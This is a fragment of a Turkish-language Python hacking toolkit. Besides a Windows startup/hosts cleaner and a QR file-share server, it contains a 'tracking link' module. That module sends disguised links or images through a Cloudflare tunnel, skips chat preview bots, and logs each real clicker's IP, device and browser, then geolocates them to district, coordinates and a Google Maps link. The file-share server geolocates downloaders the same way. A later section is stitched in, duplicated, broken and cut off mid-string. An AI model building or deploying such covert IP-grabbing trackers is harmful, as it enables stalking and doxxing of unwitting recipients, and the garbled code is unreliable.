        print(f"\n  {GREEN}[~] Startup kayıtlari kontrol ediliyor...{R}\n")
        spin("Registry startup taranıyor", 2)
        BILINEN_GUVENLI = {
            "windows security","microsoft onedrive","discord","steam",
            "spotify","nvidia","amd","intel","realtek","logitech",
            "zoom","slack","teams","dropbox","google","chrome",
        }
        startup_paths = [
            (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
        ]
        supheli_start = []
        for hive, path in startup_paths:
            try:
                key = winreg.OpenKey(hive, path)
                i = 0
                while True:
                    try:
                        name, val, _ = winreg.EnumValue(key, i)
                        guvenli = any(g in name.lower() or g in val.lower()
                                      for g in BILINEN_GUVENLI)
                        if not guvenli:
                            supheli_start.append({"isim": name, "yol": val[:60]})
                        i += 1
                    except OSError: break
                winreg.CloseKey(key)
            except: pass

        if not supheli_start:
            success("Supheli startup girisi bulunamadi!")
        else:
            print(f"\n  {BOLD}{GREEN}{'STARTUP GIRISI':<30}{'YOL'}{R}")
            divider()
            for st in supheli_start:
                print(f"  {YELLOW}{st['isim']:<30}{R}{DGREEN}{st['yol']}{R}")
            thick()
            warn(f"{len(supheli_start)} bilinmeyen startup girisi bulundu.")
            if s != "7" and confirm("Bilinmeyen startup girislerini kaldirmak ister misin?"):
                for st in supheli_start:
                    try:
                        for hive, path in startup_paths:
                            try:
                                key = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
                                winreg.DeleteValue(key, st["isim"])
                                winreg.CloseKey(key)
                            except: pass
                    except: pass
                success("Startup girisler temizlendi.")
        if s != "7": pause()

    # ── [5] Hosts Dosyası Kontrolü ───────────────────
    if s in ("5","7"):
        print(f"\n  {GREEN}[~] Hosts dosyasi kontrol ediliyor...{R}\n")
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        try:
            with open(hosts_path, "r", encoding="utf-8", errors="replace") as f:
                satirlar = f.readlines()

            NORMAL_HOSTS = {"localhost","ip6-localhost","ip6-loopback","broadcasthost"}
            supheli_hosts = []
            for sat in satirlar:
                sat = sat.strip()
                if not sat or sat.startswith("#"): continue
                parts = sat.split()
                if len(parts) >= 2:
                    domain = parts[1].lower()
                    if not any(n in domain for n in NORMAL_HOSTS):
                        supheli_hosts.append(sat)

            if not supheli_hosts:
                success("Hosts dosyasi temiz, supheli giris yok!")
            else:
                print(f"\n  {BOLD}{GREEN}Supheli Hosts Girisleri:{R}")
                divider()
                for h in supheli_hosts:
                    print(f"  {RED}{h}{R}")
                thick()
                warn(f"{len(supheli_hosts)} supheli hosts girisi bulundu.")
                if s != "7" and confirm("Supheli satirlar temizlensin mi?"):
                    temiz = [l for l in satirlar
                             if l.strip().startswith("#") or
                             not l.strip() or
                             l.strip() not in supheli_hosts]
                    with open(hosts_path,"w",encoding="utf-8") as f:
                        f.writelines(temiz)
                    success("Hosts dosyasi temizlendi.")
        except PermissionError:
            error("Hosts dosyasini okumak icin yonetici yetkisi gerekiyor.")
        except Exception as e:
            error(f"Hata: {e}")
        if s != "7": pause()

    # ── [6] Defender Karantina Temizle ───────────────
    if s in ("6","7"):
        print(f"\n  {GREEN}[~] Defender karantinasi temizleniyor...{R}\n")
        spin("Karantina temizleniyor", 2)
        try:
            subprocess.run(
                ["powershell","-Command",
                 "Remove-MpThreat -ErrorAction SilentlyContinue"],
                stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
            )
            success("Defender karantinasi bosaltildi.")
        except Exception as e:
            error(f"Hata: {e}")
        if s != "7": pause()

    # ── [7] Tam Tarama özeti ─────────────────────────
    if s == "7":
        thick()
        success("Tam tarama tamamlandi!")
        info("Yukarıdaki sonuclari inceleyin.")
        pause()

    if s not in ("0","1","2","3","4","5","6","7"):
        warn("Gecersiz secim."); time.sleep(0.8)



# ════════════════════════════════════════════════
#  27. QR DOSYA PAYLAŞIMI
# ════════════════════════════════════════════════
def menu_qr_dosya():
    banner("QR DOSYA PAYLASIMI", "Dosyayi QR ile herkese gonder")
    print(f"  {DGREEN}Dosyayi sec, QR olusturulur, okuyan cihaz indirir.{R}")
    print(f"  {DGREEN}Max dosya boyutu: 500 MB{R}")
    print(f"  {DGREEN}Dosya secmek icin Enter'a basin veya yolu elle yazin.{R}\n")

    # Windows dosya secme penceresi dene
    dosya_yolu = ""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        print(f"  {GREEN}[~] Dosya secme penceresi aciliyor...{R}")
        dosya_yolu = filedialog.askopenfilename(
            title="Gondermek istedigin dosyayi sec",
            filetypes=[
                ("Tum Dosyalar", "*.*"),
                ("Resimler", "*.jpg *.jpeg *.png *.gif *.bmp"),
                ("Videolar", "*.mp4 *.avi *.mkv *.mov"),
                ("Arsivler", "*.zip *.rar *.7z"),
                ("Belgeler", "*.pdf *.docx *.xlsx *.txt"),
            ]
        )
        root.destroy()
    except Exception:
        pass

    # Pencere acilmadiysa veya iptal edildiyse elle sor
    if not dosya_yolu:
        print(f"  {GREEN}Dosya yolu (surukle birak veya yaz):{R}  ", end="")
        dosya_yolu = input().strip().strip('"')

    if not os.path.isfile(dosya_yolu):
        error("Dosya bulunamadi."); pause(); return

    boyut = os.path.getsize(dosya_yolu)
    MAX_BOYUT = 500 * 1024 * 1024  # 500 MB

    if boyut > MAX_BOYUT:
        error(f"Dosya cok buyuk: {round(boyut/1024/1024,1)} MB (max 500 MB)"); pause(); return

    dosya_adi = os.path.basename(dosya_yolu)
    boyut_str = f"{round(boyut/1024/1024,2)} MB" if boyut > 1024*1024 else f"{round(boyut/1024,1)} KB"

    lv("  Dosya", dosya_adi, lc=DGREEN, vc=WHITE)
    lv("  Boyut", boyut_str, lc=DGREEN, vc=WHITE)
    print()

    # qrcode kontrolü
    try:
        import qrcode as qrlib
    except ImportError:
        info("qrcode yukleniyor...")
        subprocess.run([sys.executable,"-m","pip","install","qrcode","--quiet"],
                       stderr=subprocess.DEVNULL)
        try:
            import qrcode as qrlib
        except:
            error("qrcode yuklenemedi."); pause(); return

    import threading as _th2
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import mimetypes, re as _re3

    PORT_D = 5858
    indirenler = []
    indirenler_lock = _th2.Lock()

    # ── İndirme HTML sayfası ──────────────────────
    INDIRME_HTML = f"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Dosya Indir</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0d1117;color:#c9d1d9;font-family:Arial,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;padding:20px}}
.card{{border:1px solid #30363d;background:#161b22;border-radius:10px;
       padding:28px 24px;width:100%;max-width:400px;text-align:center}}
.icon{{font-size:52px;margin-bottom:14px}}
h1{{color:#58a6ff;font-size:1.1em;margin-bottom:8px}}
.fname{{color:#e6edf3;font-size:.95em;margin:10px 0 4px;
        word-break:break-all;font-weight:bold}}
.fsize{{color:#8b949e;font-size:.8em;margin-bottom:20px}}
.btn{{display:block;background:#238636;color:#fff;text-decoration:none;
      border-radius:6px;padding:13px 24px;font-size:1em;font-weight:bold;
      margin-top:8px}}
.btn:hover{{background:#2ea043}}
.info{{color:#8b949e;font-size:.75em;margin-top:14px;line-height:1.6}}
</style>
</head>
<body>
<div class="card">
  <div class="icon">&#128229;</div>
  <h1>Dosya Hazir</h1>
  <div class="fname">{dosya_adi}</div>
  <div class="fsize">{boyut_str}</div>
  <a class="btn" href="/indir">&#11015; Indir</a>
  <div class="info">Dosya guvenli sunucudan iletilmektedir.</div>
</div>
</body>
</html>""".encode("utf-8")

    # ── HTTP Handler ──────────────────────────────
    class DosyaHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            ip = ""
            forwarded = self.headers.get("X-Forwarded-For","")
            if forwarded:
                for part in forwarded.split(","):
                    p = part.strip()
                    if ":" not in p and p:
                        ip = p; break
                if not ip: ip = forwarded.split(",")[0].strip()
            if not ip or ":" in ip:
                cf = self.headers.get("CF-Connecting-IP","")
                if cf and ":" not in cf: ip = cf
            if not ip: ip = self.client_address[0]
            ua = self.headers.get("User-Agent","?")

            path = self.path.split("?")[0]

            # Favicon vs. yoksay
            if path not in ("/", "/indir"):
                self.send_response(204); self.end_headers(); return

            # Ana sayfa — indirme sayfası
            if path == "/":
                with indirenler_lock:
                    indirenler.append({"ip": ip, "ua": ua, "tip": "SAYFA"})
                self.send_response(200)
                self.send_header("Content-Type","text/html; charset=utf-8")
                self.send_header("Cache-Control","no-cache")
                self.end_headers()
                self.wfile.write(INDIRME_HTML)
                return

            # /indir — dosyayı gönder
            if path == "/indir":
                try:
                    mime = mimetypes.guess_type(dosya_yolu)[0] or "application/octet-stream"
                    self.send_response(200)
                    self.send_header("Content-Type", mime)
                    self.send_header("Content-Disposition", f'attachment; filename="{dosya_adi}"')
                    self.send_header("Content-Length", str(boyut))
                    self.end_headers()
                    # Chunk chunk gönder — büyük dosyalar için
                    with open(dosya_yolu, "rb") as f:
                        while True:
                            chunk = f.read(1024 * 1024)  # 1MB chunk
                            if not chunk: break
                            self.wfile.write(chunk)
                    with indirenler_lock:
                        indirenler.append({"ip": ip, "ua": ua, "tip": "INDIRDI"})
                except Exception as e:
                    pass

        def log_message(self, *args):
            pass

    def yazdir_indiren(z, idx):
        from datetime import datetime
        saat = datetime.now().strftime("%H:%M:%S")
        tip  = z.get("tip","?")
        if tip == "INDIRDI":
            print(f"\n  {BOLD}{GREEN}{'═'*50}{R}")
            print(f"  {BOLD}{GREEN}  [+] #{idx} DOSYAYI INDIRDI  [{saat}]{R}")
            print(f"  {GREEN}{'═'*50}{R}")
        else:
            print(f"\n  {BOLD}{DGREEN}  [~] #{idx} SAYFAYI ACTI  [{saat}]{R}")
            print(f"  {GREEN}{'─'*50}{R}")
        # IP konum
        try:
            ip_s = z["ip"]
            if ":" in ip_s:
                try: ip_s = requests.get("https://api4.ipify.org", timeout=2).text.strip()
                except: pass
            rl = requests.get(
                f"http://ip-api.com/json/{ip_s}?fields=status,city,district,regionName,country,isp",
                timeout=3).json()
            if rl.get("status") == "success":
                ilce  = rl.get("district","")
                sehir = rl.get("city","?")
                bolge = rl.get("regionName","?")
                ulke  = rl.get("country","?")
                konum = (f"{ilce}, {sehir}" if ilce and ilce != sehir else sehir)
                konum += f" / {ulke}"
                isp   = rl.get("isp","?")
            else:
                konum = "?"; isp = "?"
        except:
            konum = "?"; isp = "?"
        lv("  IP",    z["ip"], lc=DGREEN, vc=RED)
        lv("  Konum", konum,   lc=DGREEN, vc=RED)
        lv("  ISP",   isp,     lc=DGREEN, vc=GRAY)
        print(f"  {GREEN}{'═'*50}{R}\n")

    # ── Sunucu başlat ─────────────────────────────
    sunucu = HTTPServer(("0.0.0.0", PORT_D), DosyaHandler)
    t = _th2.Thread(target=sunucu.serve_forever, daemon=True)
    t.start()

    # Cloudflared ile tünel aç
    CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
    if not os.path.isfile(CF_EXE):
        spin("Cloudflared indiriliyor...", 3)
        CF_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        try:
            import urllib.request
            os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)
            urllib.request.urlretrieve(CF_URL, CF_EXE)
        except Exception as e:
            error(f"Cloudflared indirilemedi: {e}"); sunucu.shutdown(); pause(); return

    spin("Cloudflare tuneli aciliyor...", 2)
    cf_proc = subprocess.Popen(
        [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_D}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # URL'yi yakala
    import re as _re4
    public_url = None
    deadline = time.time() + 20
    while time.time() < deadline:
        line = cf_proc.stderr.readline().decode("utf-8", errors="replace")
        m = _re4.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m:
            public_url = m.group(0); break

    if not public_url:
        cf_proc.terminate(); sunucu.shutdown()
        error("Cloudflare URL alinamadi."); pause(); return

    # QR oluştur
    try:
        import qrcode as qrlib2
    except:
        qrlib2 = qrlib

    clear()
    banner("QR DOSYA PAYLASIMI", "Dosya hazir")
    lv("  Dosya",   dosya_adi,   lc=DGREEN, vc=WHITE)
    lv("  Boyut",   boyut_str,   lc=DGREEN, vc=WHITE)
    lv("  URL",     public_url,  lc=DGREEN, vc=GREEN)
    print()

    # QR bas
    qr = qrlib2.QRCode(border=2)
    qr.add_data(public_url)
    qr.make(fit=True)
    try:
        "██".encode(sys.stdout.encoding or "utf-8")
        dolu, bos = "██", "  "
    except:
        dolu, bos = "##", "  "
    for row in qr.get_matrix():
        print("  " + GREEN + "".join(dolu if c else bos for c in row) + R)

    print(f"\n  {GREEN}QR'i tara veya linki ac — indirme baslayacak.{R}")
    print(f"  {DGREEN}Cikmak icin CTRL+C{R}\n")
    thick()

    try:
        sayac = 0
        while True:
            time.sleep(0.5)
            with indirenler_lock:
                if indirenler:
                    batch = indirenler[:]
                    indirenler.clear()
                else:
                    batch = []
            for z in batch:
                sayac += 1
                yazdir_indiren(z, sayac)
    except KeyboardInterrupt:
        cf_proc.terminate()
        sunucu.shutdown()
        clear(); success("Dosya paylasimi kapatildi."); pause()



# ════════════════════════════════════════════════
#  28. TAKİP LİNKİ / TRACKING PIXEL
# ════════════════════════════════════════════════
def menu_takip_linki():
    banner("TAKIP LINKI", "Tıklayana IP · Cihaz · Konum dusunsun")
    print(f"  {DGREEN}Olusturulan link paylasilir, tiklayanin bilgileri terminale duser.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Sade Link{R}               {DGREEN}Tıklayınca bilgi düşer, siteye yonlendir{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Resim Linki{R}             {DGREEN}Link resmi gosterir, bilgi duser{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}PNG Olustur + Link{R}      {DGREEN}PNG kaydeder (indir=bilgi) + link{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Discord Resim + Takip{R}   {DGREEN}DM'de resim, 'Tarayicida Ac'=bilgi duser{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0": return
    if s not in ("1","2","3","4"):
        warn("Gecersiz secim."); time.sleep(0.8); return

    import threading as _th5, re as _re5, mimetypes as _mt5
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from datetime import datetime

    PORT_T    = 5959
    kayitlar  = []
    kyt_lock  = _th5.Lock()
    pub_url_holder = [""]  # mod 4 icin URL buraya yazilacak

    # Yönlendirme (mod 1)
    yonlendir = ""
    if s == "1":
        print(f"\n  {GREEN}Tıklayınca gidecek URL (bos = boş sayfa):{R}  ", end="")
        yonlendir = input().strip()
        if yonlendir and not yonlendir.startswith("http"):
            yonlendir = "https://" + yonlendir

    # Resim seçimi (mod 2, 3 ve 4)
    resim_yolu = ""
    if s in ("2","3","4"):
        try:
            import tkinter as tk
            from tkinter import filedialog
            root = tk.Tk(); root.withdraw()
            root.attributes("-topmost", True)
            resim_yolu = filedialog.askopenfilename(
                title="Resim sec",
                filetypes=[("Resimler","*.jpg *.jpeg *.png *.gif *.bmp *.webp"),("Tum","*.*")]
            )
            root.destroy()
        except: pass
        if not resim_yolu:
            print(f"  {GREEN}Resim yolu:{R}  ", end="")
            resim_yolu = input().strip().strip('"')
        if not os.path.isfile(resim_yolu):
            error("Resim bulunamadi."); pause(); return

    # Mod 3 — resmi PNG olarak masaüstüne kopyala
    if s == "3":
        masaustu = os.path.join(os.path.expanduser("~"), "Desktop")
        png_hedef = os.path.join(masaustu, "foto_paylasim.png")
        try:
            import shutil as _sh
            _sh.copy2(resim_yolu, png_hedef)
            success(f"Resim masaustune kopyalandi: foto_paylasim.png")
            info("Bu resmi karsı tarafa gonderebilirsin.")
            info("Asagidaki linki de paylasilirsan tıklayanda bilgi duser.")
        except Exception as e:
            error(f"Resim kopyalanamadi: {e}")

    # ── HTTP Handler ──────────────────────────────
    class TakipHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            ip = ""
            fwd = self.headers.get("X-Forwarded-For","")
            if fwd:
                for p in fwd.split(","):
                    p = p.strip()
                    if ":" not in p and p: ip = p; break
                if not ip: ip = fwd.split(",")[0].strip()
            if not ip or ":" in ip:
                cf = self.headers.get("CF-Connecting-IP","")
                if cf and ":" not in cf: ip = cf
            if not ip: ip = self.client_address[0]
            ua  = self.headers.get("User-Agent","?")
            pth = self.path.split("?")[0]

            # Favicon vs yoksay
            if pth in ("/favicon.ico","/robots.txt"):
                self.send_response(204); self.end_headers(); return

            # /foto.jpg — Discord embed icin resim ver (mod 2 ve 4)
            if pth in ("/foto.jpg", "/") and s in ("2","4") and os.path.isfile(resim_yolu):
                import mimetypes as _mte
                mime_e = _mte.guess_type(resim_yolu)[0] or "image/jpeg"
                bot_ua_list = ["Discordbot","TelegramBot","WhatsApp","facebookexternalhit",
                               "Twitterbot","LinkedInBot","Slackbot","curl","python-requests"]
                is_bot_e = any(b.lower() in ua.lower() for b in bot_ua_list)
                if not is_bot_e:
                    with kyt_lock:
                        kayitlar.append({
                            "ip": ip, "ua": ua,
                            "saat": datetime.now().strftime("%H:%M:%S"),
                            "tip": "ACILDI"
                        })
                # Her durumda direkt resmi ver — indirme degil inline goster
                try:
                    with open(resim_yolu,"rb") as f:
                        data_e = f.read()
                    self.send_response(200)
                    self.send_header("Content-Type", mime_e)
                    self.send_header("Content-Length", str(len(data_e)))
                    self.send_header("Cache-Control","no-store")
                    self.send_header("Access-Control-Allow-Origin","*")
                    self.end_headers()
                    self.wfile.write(data_e)
                except:
                    self.send_response(404); self.end_headers()
                return

            # Bot/crawler ise kaydetme (Discord, Telegram önizleme botları)
            bot_ua = ["Discordbot","TelegramBot","WhatsApp","facebookexternalhit",
                      "Twitterbot","LinkedInBot","Slackbot","curl","python-requests"]
            is_bot = any(b.lower() in ua.lower() for b in bot_ua)

            if not is_bot:
                # Gerçek insan — kaydet
                with kyt_lock:
                    kayitlar.append({
                        "ip": ip, "ua": ua,
                        "saat": datetime.now().strftime("%H:%M:%S")
                    })

            if s in ("2","3") and os.path.isfile(resim_yolu):
                import mimetypes as _mts
                mime = _mts.guess_type(resim_yolu)[0] or "image/jpeg"
                # Discord icin: /foto.jpg ile biten URL resim olarak embed edilir
                # Bot onizleme istegi gelirse sadece resmi ver
                # Gercek kullanici gelirse tam ekran HTML goster (tiklama kaydedildi)
                if is_bot:
                    # Discord/Telegram bot — sadece resim ver, embed icin
                    try:
                        with open(resim_yolu,"rb") as f:
                            data = f.read()
                        self.send_response(200)
                        self.send_header("Content-Type", mime)
                        self.send_header("Content-Length", str(len(data)))
                        self.send_header("Cache-Control","no-cache")
                        self.end_headers()
                        self.wfile.write(data)
                    except:
                        self.send_response(404); self.end_headers()
                else:
                    # Gercek kullanici tikladi — tam ekran resim goster
                    og = pub_url_holder[0] if pub_url_holder else ""
                    html_resim = (
                        "<!DOCTYPE html><html><head>"
                        "<meta charset='UTF-8'>"
                        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                        "<style>"
                        "*{margin:0;padding:0;box-sizing:border-box}"
                        "body{background:#000;display:flex;align-items:center;"
                        "justify-content:center;min-height:100vh}"
                        "img{max-width:100%;max-height:100vh;object-fit:contain;"
                        "pointer-events:none;user-select:none}"
                        "</style>"
                        "</head><body>"
                        f"<img src='{og}/img' alt='' draggable='false' "
                        "oncontextmenu='return false'>"
                        "</body></html>"
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type","text/html; charset=utf-8")
                    self.send_header("Cache-Control","no-cache")
                    self.end_headers()
                    self.wfile.write(html_resim)
            else:
                # Mod 1 — yönlendirme sayfası
                yonlendir_meta = f"<meta http-equiv='refresh' content='0;url={yonlendir}'>" if yonlendir else ""
                html = (
                    f"<!DOCTYPE html><html><head><meta charset='UTF-8'>{yonlendir_meta}"
                    "<style>body{background:#111;color:#fff;font-family:Arial;"
                    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
                    ".sp{width:36px;height:36px;border:4px solid #333;border-top:4px solid #58a6ff;"
                    "border-radius:50%;animation:s 1s linear infinite;margin:0 auto 12px}"
                    "@keyframes s{to{transform:rotate(360deg)}}</style>"
                    f"</head><body><div style='text-align:center'><div class='sp'></div>"
                    f"<p>{'Yonlendiriliyor...' if yonlendir else 'Yukleniyor...'}</p>"
                    "</div></body></html>"
                ).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type","text/html; charset=utf-8")
                self.send_header("Cache-Control","no-cache")
                self.end_headers()
                self.wfile.write(html)

        def log_message(self, *args): pass

    def yazdir_tiklayanin(z, idx):
        tip = z.get("tip","")
        baslik = "TARAYICIDE ACTI" if tip == "FOTO_AC" else "TIKLADI"
        print(f"\n  {BOLD}{YELLOW}{'═'*50}{R}")
        print(f"  {BOLD}{YELLOW}  [!] #{idx} {baslik}  [{z['saat']}]{R}")
        print(f"  {YELLOW}{'═'*50}{R}")
        cihaz, os_, br_ = ua_parse(z["ua"])
        lv("  Cihaz",    cihaz,  lc=DGREEN, vc=WHITE)
        lv("  OS",       os_,    lc=DGREEN, vc=WHITE)
        lv("  Tarayici", br_,    lc=DGREEN, vc=WHITE)
        lv("  IP",       z["ip"],lc=DGREEN, vc=RED)
        try:
            ip_s = z["ip"]
            if ":" in ip_s:
                try: ip_s = requests.get("https://api4.ipify.org",timeout=2).text.strip()
                except: pass
            rl = requests.get(
                f"http://ip-api.com/json/{ip_s}?fields=status,city,district,regionName,country,isp,lat,lon",
                timeout=3).json()
            if rl.get("status") == "success":
                ilce  = rl.get("district","")
                sehir = rl.get("city","?")
                ulke  = rl.get("country","?")
                konum = (f"{ilce}, {sehir}" if ilce and ilce!=sehir else sehir)+f" / {ulke}"
                lv("  Konum",   konum,           lc=DGREEN, vc=RED)
                lv("  ISP",     rl.get("isp","?"),lc=DGREEN, vc=GRAY)
                lat = rl.get("lat","?"); lon = rl.get("lon","?")
                if lat != "?":
                    lv("  Koordinat",f"{lat}, {lon}",lc=DGREEN,vc=GRAY)
                    lv("  Maps",f"https://maps.google.com/?q={lat},{lon}",lc=DGREEN,vc=DGREEN)
        except: pass
        print(f"  {YELLOW}{'═'*50}{R}\n")

    # ── Sunucu + Cloudflare ───────────────────────
    sunucu = HTTPServer(("0.0.0.0", PORT_T), TakipHandler)
    th = _th5.Thread(target=sunucu.serve_forever, daemon=True)
    th.start()

    CF_EXE = os.path.join(os.path.expanduser("~"), ".soldaten", "cloudflared.exe")
    if not os.path.isfile(CF_EXE):
        spin("Cloudflared indiriliyor...", 3)
        try:
            import urllib.request
            os.makedirs(os.path.dirname(CF_EXE), exist_ok=True)
            urllib.request.urlretrieve(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                CF_EXE)
        except Exception as e:
            error(f"Cloudflared indirilemedi: {e}"); sunucu.shutdown(); pause(); return

    spin("Cloudflare tuneli aciliyor...", 2)
    cf_p = subprocess.Popen(
        [CF_EXE, "tunnel", "--url", f"http://localhost:{PORT_T}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    public_url = None
    deadline = time.time() + 20
    while time.time() < deadline:
        line = cf_p.stderr.readline().decode("utf-8", errors="replace")
        m = _re5.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if m: public_url = m.group(0); break

    if not public_url:
        cf_p.terminate(); sunucu.shutdown()
        error("Cloudflare URL alinamadi."); pause(); return

    clear()
    banner("TAKIP LINKI","Aktif")
    lv("  Link", public_url, lc=DGREEN, vc=GREEN)
    if s == "3":
        lv("  PNG ", os.path.join(os.path.expanduser("~"),"Desktop","foto_paylasim.png"), lc=DGREEN, vc=WHITE)
    print()

    # QR
    try:
        import qrcode as _qrl
        qr = _qrl.QRCode(border=2)
        qr.add_data(public_url)
        qr.make(fit=True)
        try:
            "██".encode(sys.stdout.encoding or "utf-8")
            d,b = "██","  "
        except:
            d,b = "##","  "
        for row in qr.get_matrix():
            print("  "+GREEN+"".join(d if c else b for c in row)+R)
    except: pass

    print(f"\n  {GREEN}Linki paylas — tıklayan terminale duser.{R}")
    print(f"  {DGREEN}Cikmak icin CTRL+C{R}\n"); thick()

    try:
        sayac = 0
        while True:
            time.sleep(0.5)
            with kyt_lock:
                batch = kayitlar[:]; kayitlar.clear()
            for z in batch:
                sayac += 1
                yazdir_tiklayanin(z, sayac)
    except KeyboardInterrupt:
        cf_p.terminate(); sunucu.shutdown()
        clear(); success("Takip linki kapatildi."); pause()


# ════════════════════════════════════════════════
#  29. EKRAN GORUNTUSU AL

    # Yönlendirme URL'si (isteğe bağlı)
    yonlendir = ""
    if s == "1":
        print(f"\n  {GREEN}Tıklayinca yonlendirilecek URL (bos birak = sayfa kapanir):{R}  ", end="")
        yonlendir = input().strip()
        if yonlendir and not yonlendir.startswith("http"):
            yonlendir = "https://" + yonlendir

    # Resim seçimi (mod 3 ve mod 4)
    resim_yolu = ""
    if s in ("3","4"):
        try:
            import tkinter as tk
            from tkinter import filedialog
            root = tk.Tk(); root.withdraw()
            root.attributes("-topmost", True)
            print(f"  {GREEN}[~] Resim dosyasi seciliyor...{R}")
            resim_yolu = filedialog.askopenfilename(
                title="Gosterilecek resmi sec",
                filetypes=[("Resimler","*.jpg *.jpeg *.png *.gif *.bmp *.webp"),("Tum","*.*")]
            )
            root.destroy()
        except: pass
        if not resim_yolu:
            print(f"  {GREEN}Resim yolu:{R}  ", end="")
            resim_yolu = input().strip().strip('"')
        if not os.path.isfile(resim_yolu):
            error("Resim bulunamadi."); pause(); return

    # ── HTML sayfaları ───────────────────────────
    # Mod 1 — yönlendirme
    HTML_LINK = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Sayfa Yukleniyor</title>
{"<meta http-equiv='refresh' content='0;url=" + yonlendir + "'>" if yonlendir else ""}
<style>body{{background:#111;color:#fff;font-family:Arial;display:flex;
align-items:center;justify-content:center;height:100vh;margin:0}}
.s{{text-align:center}}.sp{{width:40px;height:40px;border:4px solid #333;
border-top:4px solid #58a6ff;border-radius:50%;animation:spin 1s linear infinite;
margin:0 auto 16px}}@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>
</head><body><div class="s"><div class="sp"></div>
<p>{"Yonlendiriliyor..." if yonlendir else "Sayfa yukleniyor..."}</p>
</div></body></html>""".encode("utf-8")
    PIXEL_GIF = (
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
        b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
        b"\x00\x00\x02\x02D\x01\x00;"
    )

    # Mod 4 — Open Graph HTML (Discord/Telegram'da resim gibi görünür)
    # URL'yi sonradan dolduracağız
    resim_adi = os.path.basename(resim_yolu) if resim_yolu else "foto.jpg"
    import mimetypes as _mt
    resim_mime = _mt.guess_type(resim_yolu)[0] if resim_yolu else "image/jpeg"

    # ── HTTP Handler ─────────────────────────────
    class TakipHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            # IP al
            ip = ""
            fwd = self.headers.get("X-Forwarded-For","")
            if fwd:
                for p in fwd.split(","):
                    p = p.strip()
                    if ":" not in p and p: ip = p; break
                if not ip: ip = fwd.split(",")[0].strip()
            if not ip or ":" in ip:
                cf = self.headers.get("CF-Connecting-IP","")
                if cf and ":" not in cf: ip = cf
            if not ip: ip = self.client_address[0]
            ua = self.headers.get("User-Agent","?")
            path = self.path.split("?")[0]

            # Favicon vs yoksay
            if path in ("/favicon.ico","/robots.txt"):
                self.send_response(204); self.end_headers(); return

            # Tıklamayı kaydet
            with tik_lock:
                tıklar.append({
                    "ip": ip, "ua": ua,
                    "path": path,
                    "saat": datetime.now().strftime("%H:%M:%S")
                })

            # Yanıt ver
            if s == "2":
                # Mod 2 — tam ekran resim sayfası, indirme YOK
                import mimetypes as _mts2
                mime2 = _mts2.guess_type(resim_yolu)[0] or "image/jpeg"
                og = pub_url_holder[0] if pub_url_holder else ""
                if path == "/img":
                    # Resmi ver
                    try:
                        with open(resim_yolu,"rb") as f:
                            data2 = f.read()
                        self.send_response(200)
                        self.send_header("Content-Type", mime2)
                        self.send_header("Content-Length", str(len(data2)))
                        self.send_header("Cache-Control","no-cache")
                        self.end_headers()
                        self.wfile.write(data2)
                    except:
                        self.send_response(404); self.end_headers()
                else:
                    # Ana sayfa — tam ekran resim, indirme yok
                    html2 = (
                        "<!DOCTYPE html><html><head>"
                        "<meta charset='UTF-8'>"
                        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                        "<meta property='og:type' content='website'>"
                        "<meta property='og:title' content=' '>"
                        "<meta property='og:description' content=' '>"
                        f"<meta property='og:image' content='{og}/img'>"
                        f"<meta property='og:image:type' content='{mime2}'>"
                        "<meta property='og:image:width' content='1200'>"
                        "<meta property='og:image:height' content='630'>"
                        f"<meta property='og:url' content='{og}'>"
                        "<meta name='twitter:card' content='summary_large_image'>"
                        f"<meta name='twitter:image' content='{og}/img'>"
                        "<style>"
                        "*{margin:0;padding:0;box-sizing:border-box}"
                        "body{background:#000;display:flex;align-items:center;"
                        "justify-content:center;min-height:100vh;overflow:hidden}"
                        "img{max-width:100%;max-height:100vh;object-fit:contain;"
                        "display:block;pointer-events:none}"
                        "</style>"
                        "</head><body>"
